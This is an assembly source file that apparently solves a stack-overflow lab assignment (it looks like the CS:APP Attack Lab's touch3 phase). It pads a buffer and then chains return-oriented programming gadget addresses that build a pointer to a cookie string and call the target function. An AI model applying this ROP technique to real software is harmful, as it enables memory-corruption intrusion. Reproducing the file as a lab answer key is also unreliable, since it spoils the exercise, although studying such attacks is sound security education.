bits 64

; goal:
;     mov edi, <addr of str 59b997fa / qword 6166373939623935h>
;     push qword 4017ECh
;     ret

section shellcode start=0h vstart=5561DC78h
shellcode_start:
    times 28h db ' ' ; 0x0 is also valid in file input

section ret_addr start=28h vstart=5561DC78h+28h
ret_addr:
    dq 401A06h                  ; mov rax, rsp; ret
    dq 4019A2h                  ; mov rdi, rax; ret                 ; p1
    dq 4019ABh                  ; pop rax; nop; ret
    dq str-ret_addr-8
    dq 401A42h                  ; mov edx, eax; test al, al; ret
    dq 401A34h                  ; mov ecx, edx; cmp cl, cl; ret
    dq 401A13h                  ; mov esi, ecx; nop; nop; ret       ; p2
    dq 4019D6h                  ; add_xy                            ; rax = p1 + p2
    dq 4019A2h                  ; mov rdi, rax; ret
    dq 4018FAh                  ; touch3
str:
    dq '59b997fa'
